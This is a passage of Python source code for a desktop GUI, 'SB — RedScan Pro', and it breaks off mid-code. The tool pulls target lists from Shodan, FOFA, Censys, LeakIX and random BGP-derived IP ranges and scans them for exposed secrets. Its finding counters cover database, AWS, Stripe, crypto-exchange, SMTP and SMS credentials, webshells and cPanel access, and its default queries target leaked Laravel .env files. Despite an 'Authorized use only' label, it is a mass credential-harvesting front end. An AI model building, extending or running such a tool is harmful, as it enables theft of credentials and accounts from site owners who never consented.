"""
SB - Professional Security Scanner v2.0
Slick CustomTkinter GUI — Manual / Shodan / FOFA targeting,
pause/resume, colored live log, flash-on-hit counter cards.
Authorized use only.
"""

import sys
import os

# When frozen by PyInstaller, _MEIPASS contains extracted files.
# Insert it so local .py modules bundled as --add-data are importable.
if getattr(sys, 'frozen', False):
    _base = sys._MEIPASS
    if _base not in sys.path:
        sys.path.insert(0, _base)

import json
import collections as _coll
import queue as _queue
import subprocess
import threading
import time
from datetime import datetime
from tkinter import filedialog, messagebox

import customtkinter as ctk

from osint import (
    shodan_search,  SHODAN_PRESETS,
    fofa_search,    FOFA_PRESETS,
    censys_search,  CENSYS_PRESETS,
    leakix_search,  LEAKIX_PRESETS,
    crtsh_search,
    bgp_expand_targets,
    internetdb_prefilter,
)
from bgp_pool import (
    SmartIPGenerator, fetch_all_bgp_prefixes,
    generate_live_ips, DEFAULT_ASNS,
    _check_liveness_parallel,
)
from telegram_notifier import TelegramNotifier
from paths_config import PATH_MODULES
from saver import ensure_results_dir, RESULTS_DIR, get_base_dir
from scanner_core import Scanner

# ── Theme ─────────────────────────────────────────────────────────────────────
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

A       = "#00d4ff"          # cyan accent
BG_APP  = "#080c14"          # app bg
BG_PNL  = "#0d1520"          # panel bg
BG_CRD  = "#111d2c"          # card bg
BG_INP  = "#090f1a"          # input bg
BG_HDR  = "#0a1220"          # header bg
BG_ACT  = "#0a1118"          # action strip bg
C_FOUND = "#4ade80"
C_WARN  = "#fbbf24"
C_ERR   = "#f87171"
C_INFO  = "#93c5fd"
C_DIM   = "#2d3f55"
C_TS    = "#1e2d40"

FINDING_META = [
    # ── Infrastructure ───────────────────────────────────────────────────────
    ('db',             'DB Creds',       C_FOUND),
    ('aws',            'AWS Keys',       C_WARN),
    ('stripe',         'Stripe',         "#a78bfa"),
    ('shopify',        'Shopify',        "#96bf48"),
    ('binance',        'Binance',        "#f0b90b"),
    ('coinbase',       'Coinbase',       "#0052ff"),
    ('paxful',         'Paxful',         "#f7931a"),
    ('api_keys',       'API Keys',       "#34d399"),
    # ── SMTP / Email providers ───────────────────────────────────────────────
    ('mail',           'Mail/SMTP',      "#fb923c"),
    ('mailgun',        'Mailgun',        "#f97316"),
    ('sendgrid',       'SendGrid',       "#38bdf8"),
    ('postmark',       'Postmark',       "#818cf8"),
    ('brevo',          'Brevo',          "#2dd4bf"),
    ('sparkpost',      'SparkPost',      "#e879f9"),
    ('mandrill',       'Mandrill',       "#f472b6"),
    ('mailjet',        'Mailjet',        "#fb7185"),
    ('elasticemail',   'ElasticEmail',   "#fbbf24"),
    # ── SMS / Voice providers ────────────────────────────────────────────────
    ('twilio',         'Twilio',         A),
    ('plivo',          'Plivo',          "#c084fc"),
    ('nexmo',          'Nexmo/Vonage',   "#a78bfa"),
    ('messagebird',    'MessageBird',    "#60a5fa"),
    ('sinch',          'Sinch',          "#4ade80"),
    ('telnyx',         'Telnyx',         "#f87171"),
    ('bandwidth',      'Bandwidth',      "#c084fc"),
    ('africas_talking',"Africa's Talk",  "#2dd4bf"),
    ('bulksms',        'BulkSMS',        "#fb923c"),
    ('clicksend',      'ClickSend',      "#93c5fd"),
    ('clickatell',     'Clickatell',     "#38bdf8"),
    ('telesign',       'Telesign',       "#fbbf24"),
    ('sms_api',        'SMS (Other)',    "#94a3b8"),
    # ── CMS ──────────────────────────────────────────────────────────────────
    ('wordpress',      'WordPress',      "#60a5fa"),
    ('wp_exploits',    'WP Exploits',    "#ef4444"),
    ('joomla',         'Joomla',         "#f472b6"),
    ('laravel',        'Laravel',        "#38bdf8"),
    ('magento',        'Magento',        "#f97316"),
    # ── Services / Access ────────────────────────────────────────────────────
    ('shell',          'Webshell',       "#ef4444"),
    ('cpanel',         'cPanel',         C_WARN),
    ('whm',            'WHM',            "#f97316"),
    ('plesk',          'Plesk',          "#818cf8"),
    ('ftp',            'FTP',            "#93c5fd"),
    ('ssh',            'SSH',            C_FOUND),
    ('exposure',       'Exposure',       "#fb923c"),
    ('lfi',            'LFI/Traversal',  "#ef4444"),
    ('misconfig',      'Misconfig',      "#f97316"),
    ('general',        'General',        "#94a3b8"),
]

# ── Config persistence ────────────────────────────────────────────────────────
_CFG = os.path.join(get_base_dir(), 'config.json')

def _load_cfg() -> dict:
    try:
        with open(_CFG) as f:
            return json.load(f)
    except Exception:
        return {}

def _save_cfg(data: dict):
    try:
        existing = _load_cfg()
        existing.update(data)
        with open(_CFG, 'w') as f:
            json.dump(existing, f, indent=2)
    except Exception:
        pass

# ── Resource path (works in both dev and frozen exe) ─────────────────────────
def _res(name: str) -> str:
    base = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base, name)


# ── Counter card widget ───────────────────────────────────────────────────────
class CounterCard(ctk.CTkFrame):
    def __init__(self, master, label: str, color: str, **kw):
        super().__init__(master, fg_color=BG_CRD, corner_radius=8, **kw)
        ctk.CTkLabel(self, text=label, font=ctk.CTkFont(size=9),
                     text_color="#4b5563").pack(pady=(7, 0), padx=4)
        self._lbl = ctk.CTkLabel(self, text="0",
                                  font=ctk.CTkFont(size=20, weight="bold"),
                                  text_color=color)
        self._lbl.pack(pady=(0, 7))
        self._color = color

    def hit(self, n: int):
        self._lbl.configure(text=str(n))
        self.configure(fg_color="#182e1a")
        self.after(280, lambda: self.configure(fg_color=BG_CRD))

    def reset(self):
        self._lbl.configure(text="0")
        self.configure(fg_color=BG_CRD)


# ── Helper: small section label ───────────────────────────────────────────────
def _sec(parent, text: str):
    ctk.CTkLabel(parent, text=text,
                 font=ctk.CTkFont(size=9, weight="bold"),
                 text_color=A).pack(anchor="w", padx=14, pady=(12, 3))


# ── Main application ──────────────────────────────────────────────────────────
class SBScanner(ctk.CTk):

    def __init__(self):
        super().__init__()
        self.title("SBScannerPro")
        self.geometry("1560x920")
        self.minsize(1200, 760)
        self.configure(fg_color=BG_APP)

        # Set taskbar + window icon
        try:
            import ctypes
            ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(
                "SBSecurity.SBScannerV2.0"
            )
        except Exception:
            pass
        try:
            self.iconbitmap(_res('sb.ico'))
        except Exception:
            pass

        self._scanner: Scanner | None = None
        self._scan_thread: threading.Thread | None = None
        self._osint_targets:   list[str] = []
        self._bgp_targets:     list[str] = []
        self._censys_targets:  list[str] = []
        self._leakix_targets:  list[str] = []
        self._crtsh_targets:   list[str] = []
        self._stream_ip_queue: _queue.Queue | None = None
        self._stream_fetch_done = threading.Event()
        self._stream_source: str = ''
        self._stream_ip_count = 0
        self._stream_ip_file: str | None = None
        self._vuln_targets:    list[str] = []
        self._rt_email: str = ''
        self._last_target_count = 0

        # FOFA/Shodan fetch control
        self._fetch_stop  = threading.Event()
        self._fetch_pause = threading.Event()
        self._fetch_pause.set()   # set = running (not paused)

        # BGP pool control
        self._bgp_stop        = threading.Event()
        self._bgp_expand_stop = threading.Event()
        self._bgp_scan_stop   = threading.Event()
        self._bgp_generator: SmartIPGenerator | None = None

        self._counts   = {m[0]: 0 for m in FINDING_META}
        self._cards: dict[str, CounterCard] = {}
        self._cfg = _load_cfg()

        # Bounded log queue — background threads append, main thread drains every 150 ms.
        # Prevents flooding Tkinter's event loop with hundreds of after(0,...) calls.
        self._log_q: _coll.deque = _coll.deque(maxlen=2000)

        ensure_results_dir()
        self._build()
        self.after(150, self._flush_log)   # start the log drain loop

    # ══════════════════════════════════════════════════════════════════════════
    # UI BUILD
    # ══════════════════════════════════════════════════════════════════════════

    def _build(self):
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(1, weight=1)
        self._build_header()
        self._build_left()
        self._build_right()
        self._build_statusbar()

    # ── Header ────────────────────────────────────────────────────────────────
    def _build_header(self):
        hdr = ctk.CTkFrame(self, height=54, fg_color=BG_HDR, corner_radius=0)
        hdr.grid(row=0, column=0, columnspan=2, sticky="ew")
        hdr.grid_propagate(False)

        badge = ctk.CTkLabel(hdr, text=" SB ", fg_color=A, text_color=BG_APP,
                              font=ctk.CTkFont(size=16, weight="bold"),
                              corner_radius=5, width=46, height=28)
        badge.pack(side="left", padx=(16, 10), pady=13)

        ctk.CTkLabel(hdr, text="SB — RedScan Pro",
                     font=ctk.CTkFont(size=16, weight="bold"),
                     text_color="#e2e8f0").pack(side="left")

        ctk.CTkLabel(hdr, text="v3.0  ·  Stream Mode  ·  Authorized Use Only",
                     font=ctk.CTkFont(size=10), text_color="#334155").pack(side="right", padx=18)

    # ── Left panel ────────────────────────────────────────────────────────────
    def _build_left(self):
        outer = ctk.CTkFrame(self, width=370, fg_color=BG_PNL, corner_radius=0)
        outer.grid(row=1, column=0, sticky="nsew", padx=(8, 4), pady=8)
        outer.grid_propagate(False)
        outer.grid_rowconfigure(0, weight=1)
        outer.grid_rowconfigure(1, weight=0)
        outer.grid_columnconfigure(0, weight=1)

        # ── scrollable content ──────────────────────────────────────────────
        scroll = ctk.CTkScrollableFrame(outer, fg_color="transparent",
                                         corner_radius=0, scrollbar_button_color="#1e3a5f")
        scroll.grid(row=0, column=0, sticky="nsew")

        self._build_source_section(scroll)
        self._build_modules_section(scroll)
        self._build_perf_section(scroll)

        # ── fixed action strip ──────────────────────────────────────────────
        act = ctk.CTkFrame(outer, fg_color=BG_ACT, corner_radius=0)
        act.grid(row=1, column=0, sticky="ew")
        self._build_action_strip(act)

    def _build_source_section(self, parent):
        _sec(parent, "TARGET SOURCE")

        # Row 1: core sources
        self._source_seg = ctk.CTkSegmentedButton(
            parent, values=["Manual", "Shodan", "FOFA", "BGP"],
            command=self._on_source,
            font=ctk.CTkFont(size=11, weight="bold"),
            selected_color=A, selected_hover_color="#00aed4",
            unselected_color="#131f30", unselected_hover_color="#1a2d44",
            fg_color="#0c1824",
        )
        self._source_seg.set("Manual")
        self._source_seg.pack(fill="x", padx=14, pady=(0, 3))

        # Row 2: extended sources
        self._source_seg2 = ctk.CTkSegmentedButton(
            parent, values=["Censys", "LeakIX", "CRT.SH", "EB Gen"],
            command=self._on_source2,
            font=ctk.CTkFont(size=11, weight="bold"),
            selected_color="#7c3aed", selected_hover_color="#6d28d9",
            unselected_color="#131f30", unselected_hover_color="#1a2d44",
            fg_color="#0c1824",
        )
        self._source_seg2.pack(fill="x", padx=14, pady=(0, 8))

        self._src_container = ctk.CTkFrame(parent, fg_color="transparent")
        self._src_container.pack(fill="x")

        self._manual_frm  = self._mk_manual(self._src_container)
        self._shodan_frm  = self._mk_shodan(self._src_container)
        self._fofa_frm    = self._mk_fofa(self._src_container)
        self._bgp_frm     = self._mk_bgp(self._src_container)
        self._censys_frm  = self._mk_censys(self._src_container)
        self._leakix_frm  = self._mk_leakix(self._src_container)
        self._crtsh_frm   = self._mk_crtsh(self._src_container)
        self._eb_gen_frm  = self._mk_eb_gen(self._src_container)

        self._manual_frm.pack(fill="x")
        self._active_source = "Manual"

    def _mk_manual(self, parent) -> ctk.CTkFrame:
        f = ctk.CTkFrame(parent, fg_color="transparent")

        self._target_box = ctk.CTkTextbox(
            f, height=110, font=ctk.CTkFont(family="Consolas", size=11),
            fg_color=BG_INP, text_color="#c9d1d9", wrap="none",
        )
        self._target_box.pack(fill="x", padx=14, pady=(0, 5))
        self._target_box.insert("0.0", "https://target.com\n# One URL or IP per line")

        row = ctk.CTkFrame(f, fg_color="transparent")
        row.pack(fill="x", padx=14, pady=(0, 5))
        ctk.CTkButton(row, text="Upload File", command=self._upload,
                      fg_color="#12273d", hover_color="#1a3654", height=30,
                      font=ctk.CTkFont(size=11)).pack(side="left", fill="x", expand=True, padx=(0, 4))
        ctk.CTkButton(row, text="Clear", command=self._clear_targets,
                      fg_color="#1c1010", hover_color="#2e1515", height=30,
                      font=ctk.CTkFont(size=11), width=60).pack(side="right")

        self._target_count_lbl = ctk.CTkLabel(f, text="", font=ctk.CTkFont(size=10),
                                               text_color="#4b5563")
        self._target_count_lbl.pack(anchor="w", padx=14, pady=(0, 4))
        return f

    def _mk_shodan(self, parent) -> ctk.CTkFrame:
        f = ctk.CTkFrame(parent, fg_color=BG_CRD, corner_radius=8)
        cfg = self._cfg

        _sec(f, "SHODAN API KEY")
        kr = ctk.CTkFrame(f, fg_color="transparent")
        kr.pack(fill="x", padx=10, pady=(0, 6))
        self._sh_key = ctk.CTkEntry(kr, placeholder_text="Your Shodan API key",
                                     show="•", fg_color=BG_INP, height=30,
                                     font=ctk.CTkFont(size=11))
        self._sh_key.pack(side="left", fill="x", expand=True)
        if cfg.get('shodan_key'):
            self._sh_key.insert(0, cfg['shodan_key'])
        ctk.CTkButton(kr, text="Show", width=46, height=30,
                      fg_color="#12273d", hover_color="#1a3654",
                      font=ctk.CTkFont(size=10),
                      command=lambda: self._sh_key.configure(
                          show="" if self._sh_key.cget("show") == "•" else "•"
                      )).pack(side="right", padx=(4, 0))

        _sec(f, "SEARCH QUERIES  (one per line)")
        self._sh_queries = ctk.CTkTextbox(
            f, height=90, font=ctk.CTkFont(family="Consolas", size=11),
            fg_color=BG_INP, text_color="#c9d1d9", wrap="none",
        )
        self._sh_queries.pack(fill="x", padx=10, pady=(0, 2))
        saved_q = cfg.get('shodan_queries', '')
        if saved_q:
            self._sh_queries.insert("0.0", saved_q)
        else:
            self._sh_queries.insert("0.0", "http.component:laravel")

        _sec(f, "ADD PRESET QUERY")
        pg = ctk.CTkFrame(f, fg_color="transparent")
        pg.pack(fill="x", padx=10, pady=(0, 6))
        for i, (lbl, q) in enumerate(SHODAN_PRESETS.items()):
            ctk.CTkButton(
                pg, text=lbl, width=80, height=24,
                fg_color="#0f2035", hover_color="#173050",
                font=ctk.CTkFont(size=10),
                command=lambda q=q: self._sh_queries.insert("end", "\n" + q),
            ).grid(row=i // 3, column=i % 3, padx=2, pady=2, sticky="ew")
            pg.grid_columnconfigure(i % 3, weight=1)

        # ── row 1: Fetch + Clear ───────────────────────────────────────────
        r1 = ctk.CTkFrame(f, fg_color="transparent")
        r1.pack(fill="x", padx=10, pady=(6, 3))
        self._sh_fetch_btn = ctk.CTkButton(
            r1, text="▶  Fetch from Shodan",
            command=self._shodan_fetch,
            fg_color=A, hover_color="#00aed4",
            text_color=BG_APP, height=32,
            font=ctk.CTkFont(size=12, weight="bold"),
        )
        self._sh_fetch_btn.pack(side="left", fill="x", expand=True, padx=(0, 4))
        ctk.CTkButton(r1, text="Clear", width=52, height=32,
                      fg_color="#1c1010", hover_color="#2e1515",
                      font=ctk.CTkFont(size=11),
                      command=lambda: self._sh_queries.delete("0.0", "end"),
                      ).pack(side="right")

        # ── row 2: Stop + Pause/Resume (fetch control) ────────────────────
        r2 = ctk.CTkFrame(f, fg_color="transparent")
        r2.pack(fill="x", padx=10, pady=(0, 4))
        self._sh_stop_btn = ctk.CTkButton(
            r2, text="⬛  Stop Fetch",
            command=lambda: self._stop_fetch('shodan'),
            fg_color="#7f1d1d", hover_color="#991b1b",
            height=28, font=ctk.CTkFont(size=11), state="disabled",
        )
        self._sh_stop_btn.pack(side="left", fill="x", expand=True, padx=(0, 4))
        self._sh_pause_btn = ctk.CTkButton(
            r2, text="▐▐  Pause",
            command=lambda: self._toggle_fetch_pause('shodan'),
            fg_color="#7c4f0e", hover_color="#a06512",
            height=28, font=ctk.CTkFont(size=11), state="disabled",
        )
        self._sh_pause_btn.pack(side="right", fill="x", expand=True)

        sh_bot = ctk.CTkFrame(f, fg_color="transparent")
        sh_bot.pack(fill="x", padx=10, pady=(0, 4))
        self._sh_status = ctk.CTkLabel(sh_bot, text="", font=ctk.CTkFont(size=10),
                                        text_color=C_FOUND)
        self._sh_status.pack(side="left", fill="x", expand=True)
        self._sh_save_btn = ctk.CTkButton(
            sh_bot, text="💾 Save IPs", width=80, height=24,
            fg_color="#12273d", hover_color="#1a3654",
            font=ctk.CTkFont(size=10), state="disabled",
            command=lambda: self._save_fetched_ips('shodan'),
        )
        self._sh_save_btn.pack(side="right")

        sh_fs = ctk.CTkFrame(f, fg_color="transparent")
        sh_fs.pack(fill="x", padx=10, pady=(0, 4))
        self._sh_stream_btn = ctk.CTkButton(
            sh_fs, text="⚡ Fetch & Scan (Stream)",
            command=self._sh_fetch_and_scan,
            fg_color="#14532d", hover_color="#166534",
            height=28, font=ctk.CTkFont(size=11, weight="bold"),
        )
        self._sh_stream_btn.pack(fill="x")

        sh_exp = ctk.CTkFrame(f, fg_color="transparent")
        sh_exp.pack(fill="x", padx=10, pady=(0, 8))
        self._sh_expand_btn = ctk.CTkButton(
            sh_exp, text="🔗 Expand /24 Neighbours",
            command=lambda: self._expand_pool('shodan'),
            fg_color="#0f2035", hover_color="#173050", height=26,
            font=ctk.CTkFont(size=10), state="disabled",
        )
        self._sh_expand_btn.pack(side="left", fill="x", expand=True)
        return f

    def _mk_fofa(self, parent) -> ctk.CTkFrame:
        f = ctk.CTkFrame(parent, fg_color=BG_CRD, corner_radius=8)
        cfg = self._cfg

        _sec(f, "FOFA EMAIL")
        self._fo_email = ctk.CTkEntry(f, placeholder_text="your@email.com",
                                       fg_color=BG_INP, height=30,
                                       font=ctk.CTkFont(size=11))
        self._fo_email.pack(fill="x", padx=10, pady=(0, 6))
        if cfg.get('fofa_email'):
            self._fo_email.insert(0, cfg['fofa_email'])

        _sec(f, "FOFA API KEY")
        kr = ctk.CTkFrame(f, fg_color="transparent")
        kr.pack(fill="x", padx=10, pady=(0, 6))
        self._fo_key = ctk.CTkEntry(kr, placeholder_text="Your FOFA API key",
                                     show="•", fg_color=BG_INP, height=30,
                                     font=ctk.CTkFont(size=11))
        self._fo_key.pack(side="left", fill="x", expand=True)
        if cfg.get('fofa_key'):
            self._fo_key.insert(0, cfg['fofa_key'])
        ctk.CTkButton(kr, text="Show", width=46, height=30,
                      fg_color="#12273d", hover_color="#1a3654",
                      font=ctk.CTkFont(size=10),
                      command=lambda: self._fo_key.configure(
                          show="" if self._fo_key.cget("show") == "•" else "•"
                      )).pack(side="right", padx=(4, 0))

        _sec(f, "SEARCH QUERIES  (one per line)")
        self._fo_queries = ctk.CTkTextbox(
            f, height=90, font=ctk.CTkFont(family="Consolas", size=11),
            fg_color=BG_INP, text_color="#c9d1d9", wrap="none",
        )
        self._fo_queries.pack(fill="x", padx=10, pady=(0, 2))
        saved_q = cfg.get('fofa_queries', '')
        if saved_q:
            self._fo_queries.insert("0.0", saved_q)
        else:
            self._fo_queries.insert("0.0", 'app="Laravel"')

        _sec(f, "ADD PRESET QUERY")
        pg = ctk.CTkFrame(f, fg_color="transparent")
        pg.pack(fill="x", padx=10, pady=(0, 6))
        for i, (lbl, q) in enumerate(FOFA_PRESETS.items()):
            ctk.CTkButton(
                pg, text=lbl, width=80, height=24,
                fg_color="#0f2035", hover_color="#173050",
                font=ctk.CTkFont(size=10),
                command=lambda q=q: self._fo_queries.insert("end", "\n" + q),
            ).grid(row=i // 3, column=i % 3, padx=2, pady=2, sticky="ew")
            pg.grid_columnconfigure(i % 3, weight=1)

        # ── row 1: Fetch + Clear ───────────────────────────────────────────
        r1 = ctk.CTkFrame(f, fg_color="transparent")
        r1.pack(fill="x", padx=10, pady=(6, 3))
        self._fo_fetch_btn = ctk.CTkButton(
            r1, text="▶  Fetch from FOFA",
            command=self._fofa_fetch,
            fg_color=A, hover_color="#00aed4",
            text_color=BG_APP, height=32,
            font=ctk.CTkFont(size=12, weight="bold"),
        )
        self._fo_fetch_btn.pack(side="left", fill="x", expand=True, padx=(0, 4))
        ctk.CTkButton(r1, text="Clear", width=52, height=32,
                      fg_color="#1c1010", hover_color="#2e1515",
                      font=ctk.CTkFont(size=11),
                      command=lambda: self._fo_queries.delete("0.0", "end"),
                      ).pack(side="right")

        # ── row 2: Stop + Pause/Resume (fetch control) ────────────────────
        r2 = ctk.CTkFrame(f, fg_color="transparent")
        r2.pack(fill="x", padx=10, pady=(0, 4))
        self._fo_stop_btn = ctk.CTkButton(
            r2, text="⬛  Stop Fetch",
            command=lambda: self._stop_fetch('fofa'),
            fg_color="#7f1d1d", hover_color="#991b1b",
            height=28, font=ctk.CTkFont(size=11), state="disabled",
        )
        self._fo_stop_btn.pack(side="left", fill="x", expand=True, padx=(0, 4))
        self._fo_pause_btn = ctk.CTkButton(
            r2, text="▐▐  Pause",
            command=lambda: self._toggle_fetch_pause('fofa'),
            fg_color="#7c4f0e", hover_color="#a06512",
            height=28, font=ctk.CTkFont(size=11), state="disabled",
        )
        self._fo_pause_btn.pack(side="right", fill="x", expand=True)

        fo_bot = ctk.CTkFrame(f, fg_color="transparent")
        fo_bot.pack(fill="x", padx=10, pady=(0, 4))
        self._fo_status = ctk.CTkLabel(fo_bot, text="", font=ctk.CTkFont(size=10),
                                        text_color=C_FOUND)
        self._fo_status.pack(side="left", fill="x", expand=True)
        self._fo_save_btn = ctk.CTkButton(
            fo_bot, text="💾 Save IPs", width=80, height=24,
            fg_color="#12273d", hover_color="#1a3654",
            font=ctk.CTkFont(size=10), state="disabled",
            command=lambda: self._save_fetched_ips('fofa'),
        )
        self._fo_save_btn.pack(side="right")

        fo_fs = ctk.CTkFrame(f, fg_color="transparent")
        fo_fs.pack(fill="x", padx=10, pady=(0, 4))
        self._fo_stream_btn = ctk.CTkButton(
            fo_fs, text="⚡ Fetch & Scan (Stream)",
            command=self._fo_fetch_and_scan,
            fg_color="#14532d", hover_color="#166534",
            height=28, font=ctk.CTkFont(size=11, weight="bold"),
        )
        self._fo_stream_btn.pack(fill="x")

        fo_exp = ctk.CTkFrame(f, fg_color="transparent")
        fo_exp.pack(fill="x", padx=10, pady=(0, 8))
        self._fo_expand_btn = ctk.CTkButton(
            fo_exp, text="🔗 Expand /24 Neighbours",
            command=lambda: self._expand_pool('fofa'),
            fg_color="#0f2035", hover_color="#173050", height=26,
            font=ctk.CTkFont(size=10), state="disabled",
        )
        self._fo_expand_btn.pack(side="left", fill="x", expand=True)
        return f

    # ── Censys panel ──────────────────────────────────────────────────────────
    def _mk_censys(self, parent) -> ctk.CTkFrame:
        f = ctk.CTkFrame(parent, fg_color=BG_CRD, corner_radius=8)
        cfg = self._cfg

        _sec(f, "CENSYS API ID")
        self._cn_id = ctk.CTkEntry(f, placeholder_text="Your Censys API ID",
                                    fg_color=BG_INP, height=30, font=ctk.CTkFont(size=11))
        self._cn_id.pack(fill="x", padx=10, pady=(0, 6))
        if cfg.get('censys_id'):
            self._cn_id.insert(0, cfg['censys_id'])

        _sec(f, "CENSYS API SECRET")
        kr = ctk.CTkFrame(f, fg_color="transparent")
        kr.pack(fill="x", padx=10, pady=(0, 6))
        self._cn_secret = ctk.CTkEntry(kr, placeholder_text="Your Censys API Secret",
                                        show="•", fg_color=BG_INP, height=30,
                                        font=ctk.CTkFont(size=11))
        self._cn_secret.pack(side="left", fill="x", expand=True)
        if cfg.get('censys_secret'):
            self._cn_secret.insert(0, cfg['censys_secret'])
        ctk.CTkButton(kr, text="Show", width=46, height=30,
                      fg_color="#12273d", hover_color="#1a3654",
                      font=ctk.CTkFont(size=10),
                      command=lambda: self._cn_secret.configure(
                          show="" if self._cn_secret.cget("show") == "•" else "•"
                      )).pack(side="right", padx=(4, 0))

        _sec(f, "QUERIES  (one per line)")
        self._cn_queries = ctk.CTkTextbox(f, height=80, font=ctk.CTkFont(family="Consolas", size=11),
                                           fg_color=BG_INP, text_color="#c9d1d9", wrap="none")
        self._cn_queries.pack(fill="x", padx=10, pady=(0, 2))
        saved_q = cfg.get('censys_queries', '')
        self._cn_queries.insert("0.0", saved_q or 'services.http.response.body:"APP_KEY" and services.http.response.body:"DB_PASSWORD"')

        _sec(f, "ADD PRESET")
        pg = ctk.CTkFrame(f, fg_color="transparent")
        pg.pack(fill="x", padx=10, pady=(0, 6))
        for i, (lbl, q) in enumerate(CENSYS_PRESETS.items()):
            ctk.CTkButton(pg, text=lbl, width=80, height=24,
                          fg_color="#0f2035", hover_color="#173050",
                          font=ctk.CTkFont(size=10),
                          command=lambda q=q: self._cn_queries.insert("end", "\n" + q),
                          ).grid(row=i // 3, column=i % 3, padx=2, pady=2, sticky="ew")
            pg.grid_columnconfigure(i % 3, weight=1)

        r1 = ctk.CTkFrame(f, fg_color="transparent")
        r1.pack(fill="x", padx=10, pady=(4, 3))
        self._cn_fetch_btn = ctk.CTkButton(r1, text="▶  Fetch from Censys",
                                            command=self._censys_fetch,
                                            fg_color="#7c3aed", hover_color="#6d28d9",
                                            text_color="#fff", height=32,
                                            font=ctk.CTkFont(size=12, weight="bold"))
        self._cn_fetch_btn.pack(side="left", fill="x", expand=True, padx=(0, 4))
        self._cn_stop_btn = ctk.CTkButton(r1, text="⬛", width=36, height=32,
                                           command=lambda: self._fetch_stop.set(),
                                           fg_color="#7f1d1d", hover_color="#991b1b",
                                           font=ctk.CTkFont(size=11), state="disabled")
        self._cn_stop_btn.pack(side="right")

        bot = ctk.CTkFrame(f, fg_color="transparent")
        bot.pack(fill="x", padx=10, pady=(0, 8))
        self._cn_status = ctk.CTkLabel(bot, text="", font=ctk.CTkFont(size=10), text_color=C_FOUND)
        self._cn_status.pack(side="left", fill="x", expand=True)
        self._cn_save_btn = ctk.CTkButton(bot, text="💾 Save IPs", width=80, height=24,
                                           fg_color="#12273d", hover_color="#1a3654",
                                           font=ctk.CTkFont(size=10), state="disabled",
                                           command=lambda: self._save_ext_ips('censys'))
        self._cn_save_btn.pack(side="right")

        cn_fs = ctk.CTkFrame(f, fg_color="transparent")
        cn_fs.pack(fill="x", padx=10, pady=(0, 8))
        ctk.CTkButton(cn_fs, text="⚡ Fetch & Scan (Stream)",
                      command=self._cn_fetch_and_scan,
                      fg_color="#14532d", hover_color="#166534",
                      height=28, font=ctk.CTkFont(size=11, weight="bold"),
                      ).pack(fill="x")
        return f

    def _censys_fetch(self):
        api_id  = self._cn_id.get().strip()
        api_sec = self._cn_secret.get().strip()
        raw_q   = self._cn_queries.get("0.0", "end").strip()
        queries = [l.strip() for l in raw_q.splitlines() if l.strip() and not l.startswith('#')]
        if not api_id or not api_sec:
            messagebox.showwarning("Missing Keys", "Enter your Censys API ID and Secret.")
            return
        if not queries:
            messagebox.showwarning("No Queries", "Enter at least one search query.")
            return
        _save_cfg({'censys_id': api_id, 'censys_secret': api_sec, 'censys_queries': raw_q})
        self._fetch_stop.clear()
        self._cn_fetch_btn.configure(state="disabled", text="Fetching…",
                                      fg_color="#192a3e", text_color="#4b5563")
        self._cn_stop_btn.configure(state="normal")
        self._cn_status.configure(text=f"Running {len(queries)} quer(ies)…", text_color=C_WARN)

        def _run():
            targets, err = censys_search(api_id, api_sec, queries,
                                          stop_evt=self._fetch_stop, log_cb=self._log_ts)
            self.after(0, lambda: self._censys_done(targets, err))

        threading.Thread(target=_run, daemon=True).start()

    def _censys_done(self, targets, err):
        self._cn_fetch_btn.configure(state="normal", text="▶  Fetch from Censys",
                                      fg_color="#7c3aed", text_color="#fff")
        self._cn_stop_btn.configure(state="disabled")
        if targets:
            self._censys_targets = targets
            self._cn_status.configure(text=f"✓ {len(targets):,} targets ready", text_color=C_FOUND)
            self._cn_save_btn.configure(state="normal")
            self._log_found(f"[+] Censys: {len(targets):,} targets ready")
        elif err:
            self._cn_status.configure(text=f"Error: {err}", text_color=C_ERR)
            self._log_err(f"[!] {err}")
        else:
            self._cn_status.configure(text="No results", text_color=C_DIM)

    # ── LeakIX panel ──────────────────────────────────────────────────────────
    def _mk_leakix(self, parent) -> ctk.CTkFrame:
        f = ctk.CTkFrame(parent, fg_color=BG_CRD, corner_radius=8)
        cfg = self._cfg

        _sec(f, "LEAKIX API KEY  (optional — leave blank for anonymous)")
        kr = ctk.CTkFrame(f, fg_color="transparent")
        kr.pack(fill="x", padx=10, pady=(0, 6))
        self._lx_key = ctk.CTkEntry(kr, placeholder_text="l1:…  (optional)",
                                     show="•", fg_color=BG_INP, height=30,
                                     font=ctk.CTkFont(size=11))
        self._lx_key.pack(side="left", fill="x", expand=True)
        if cfg.get('leakix_key'):
            self._lx_key.insert(0, cfg['leakix_key'])
        ctk.CTkButton(kr, text="Show", width=46, height=30,
                      fg_color="#12273d", hover_color="#1a3654",
                      font=ctk.CTkFont(size=10),
                      command=lambda: self._lx_key.configure(
                          show="" if self._lx_key.cget("show") == "•" else "•"
                      )).pack(side="right", padx=(4, 0))

        _sec(f, "QUERIES  (one per line)")
        self._lx_queries = ctk.CTkTextbox(f, height=80, font=ctk.CTkFont(family="Consolas", size=11),
                                           fg_color=BG_INP, text_color="#c9d1d9", wrap="none")
        self._lx_queries.pack(fill="x", padx=10, pady=(0, 2))
        saved_q = cfg.get('leakix_queries', '')
        self._lx_queries.insert("0.0", saved_q or '+field:env')

        _sec(f, "ADD PRESET")
        pg = ctk.CTkFrame(f, fg_color="transparent")
        pg.pack(fill="x", padx=10, pady=(0, 6))
        for i, (lbl, q) in enumerate(LEAKIX_PRESETS.items()):
            ctk.CTkButton(pg, text=lbl, width=80, height=24,
                          fg_color="#0f2035", hover_color="#173050",
                          font=ctk.CTkFont(size=10),
                          command=lambda q=q: self._lx_queries.insert("end", "\n" + q),
                          ).grid(row=i // 3, column=i % 3, padx=2, pady=2, sticky="ew")
            pg.grid_columnconfigure(i % 3, weight=1)

        r1 = ctk.CTkFrame(f, fg_color="transparent")
        r1.pack(fill="x", padx=10, pady=(4, 3))
        self._lx_fetch_btn = ctk.CTkButton(r1, text="▶  Fetch from LeakIX",
                                            command=self._leakix_fetch,
                                            fg_color="#7c3aed", hover_color="#6d28d9",
                                            text_color="#fff", height=32,
                                            font=ctk.CTkFont(size=12, weight="bold"))
        self._lx_fetch_btn.pack(side="left", fill="x", expand=True, padx=(0, 4))
        self._lx_stop_btn = ctk.CTkButton(r1, text="⬛", width=36, height=32,
                                           command=lambda: self._fetch_stop.set(),
                                           fg_color="#7f1d1d", hover_color="#991b1b",
